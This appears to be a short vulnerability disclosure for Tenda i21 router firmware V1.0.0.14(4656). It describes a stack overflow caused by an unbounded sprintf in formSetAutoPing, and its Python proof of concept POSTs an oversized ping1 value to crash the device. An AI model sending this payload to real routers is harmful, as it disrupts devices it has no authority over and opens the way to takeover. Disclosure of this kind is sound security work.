## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `formSetAutoPing` function. The `ip1, ip2` variable receives the `ping1, ping2` parameter from a POST request. However, since the user can control the input of `ping1, ping2`, the statement `sprintf(auto_ping_ip, "%s;%s", ip1, ip2);` can cause a buffer overflow. The user-provided  `ping1, ping2` can exceed the capacity of the `auto_ping_ip` array, triggering this security vulnerability.

![image-20240419203954082](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419203954082.png)

## POC

```python
payload = b"a"*2000

data = {"linkEn": 1, "ping1": payload}
response = requests.post(url, data=data)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
